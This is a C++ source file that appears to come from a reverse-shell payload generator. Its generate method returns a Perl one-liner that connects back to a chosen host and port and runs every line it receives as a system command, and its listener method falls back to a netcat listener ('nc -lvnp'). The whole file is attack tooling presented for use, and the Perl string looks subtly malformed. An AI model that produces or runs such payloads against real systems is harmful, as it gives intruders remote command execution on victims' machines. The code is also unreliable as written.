#include "Perl_No_Sh_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string PerlNoShPayload::name() const {
return "perl_no_sh";
}

std::string PerlNoShPayload::generate(const Options& opts) const {
    return "perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, \"" + opts.host + ":" + std::to_string(opts.port) + "\");STDIN-->fdopen($c,w);system$_ while<>;\'";
}

std::string PerlNoShPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}